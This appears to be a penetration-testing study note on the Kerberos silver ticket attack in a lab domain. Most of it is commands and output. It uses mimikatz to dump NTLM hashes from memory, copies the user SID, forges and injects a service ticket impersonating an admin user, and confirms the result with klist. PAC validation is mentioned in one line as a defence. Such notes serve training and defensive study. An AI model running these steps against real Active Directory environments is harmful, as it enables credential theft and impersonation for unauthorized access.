Isme you already know the password of the service account. So you use that to create a *forged ticket* where you can login as a specific user (Like Administrator).
With this attack, we skip the part of requesting ticket of the service account as we already know it's password.

Can be prevented by **Privileged Account Certificate (PAC)** validation!

```powershell
# Open mimikatz in Powershell
privilege::debug
sekurlsa::logonpasswords       # Copy NTLM hash of the service user

# Next copy SID of the current user (Copy only the SID in quotes)
whoami /user

User Name SID
========= =============================================
corp\jeff "S-1-5-21-1987370270-658905905-1781884369"-1105
```

```mimikatz
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

```powershell
# Confirm ticket
klist

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```